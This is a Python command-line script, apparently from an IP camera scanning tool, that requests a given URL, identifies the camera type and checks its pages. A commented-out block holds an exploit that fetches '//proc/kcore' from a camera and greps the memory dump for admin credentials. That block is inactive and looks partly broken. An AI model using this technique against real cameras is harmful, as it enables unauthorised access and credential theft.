#!/usr/bin/env python
#-*- coding: utf-8 -*-

import requests
import os, sys
import argparse
from config import LINE, INFO, PLUS
from modules.define_cam import define_cam
from modules.check_pages import check_pages

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

"""def dlProgress(count, blockSize, totalSize):
      percent = int(count*blockSize*100/totalSize)
      sys.stdout.write("%2d%%" % percent)
      sys.stdout.write("\b\b\b")
      sys.stdout.flush()
      if percent == 25:
        print("file download.\n")
        print("\033[34m-\033[0m" * 30 + "\n")
        print("search password...")
        print("\033[34m-\033[0m" * 30 + "\n")
        os.system('strings data_two.txt | grep -i admin -A3')
        sys.exit()



def exploit_two():
    data_two = "data_two.txt"

    payload_two = "//proc/kcore"
    exploit2 = url + payload_two
    req = requests.get(url, allow_redirects=True)
    response = req.text
    if stat == 200 and "not found" not in response:
        print(exploit2)
        print("\033[32m[+] \033[0m exploit FOUND \n")
        print("exploit running...")
        dl = urllib.urlretrieve(exploit2, filename=data_two, reporthook=dlProgress)
    else:
        print("\033[33m[-] \033[0m exploit NOT")
        print("\033[34m-\033[0m" * 30 + "\n")"""



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", help="URL to scan \033[31m[required]\033[0m", dest='url')
    results = parser.parse_args()
                                     
    url = results.url
    s = requests.session()
    req = s.get(url, allow_redirects=True)
    stat  = req.status_code


    if stat not in [404, 503]:
        print("\n{}[{}] {} URL found".format(PLUS, stat, url))
        print(LINE + "\n")
        print("{}Defining type of camera...\n".format(INFO))
        define_cam(req, url, s)
        check_pages(url, s)
        #exploit_one()
    else:
        print("\033[41m [{}][-] URL not found \033[0m".format(stat))

